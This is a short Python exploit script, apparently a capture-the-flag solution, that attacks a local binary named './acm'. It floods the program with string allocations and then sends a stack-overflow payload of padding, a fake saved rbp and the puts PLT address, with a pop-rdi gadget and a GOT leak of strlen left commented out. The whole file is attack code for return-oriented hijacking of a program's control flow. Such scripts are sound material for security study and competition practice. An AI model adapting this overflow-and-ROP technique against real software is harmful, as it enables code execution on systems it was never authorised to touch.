#!/usr/bin/env python
# coding: utf-8

from binaryfang import *

elf = ELF("./acm")
p = process('./acm')
pprdi = 0x0000000000400c36

p.sendline(str(0x2700))

def addstr(content):
    p.sendline(str(1))
    p.sendline(content)

def showstr():
    p.sendline(str(2))

for i in range(0x240):
    addstr('m'*0x10)
addstr('m'*0x20)

payload = 'm'*0x60
payload += 'c'*8    # rbp
#payload += p64(pprdi)
#payload += p64(elf.got["strlen"])
payload += p64(elf.plt["puts"])
'''
length = len(payload)
for i in range(length-0x18, length):
    tmp = payload[:i] + chr(0)
    addstr(tmp)
'''
addstr(payload)
for i in range(0x10):
    addstr('m'*0x10)

pause()
showstr()
pause()

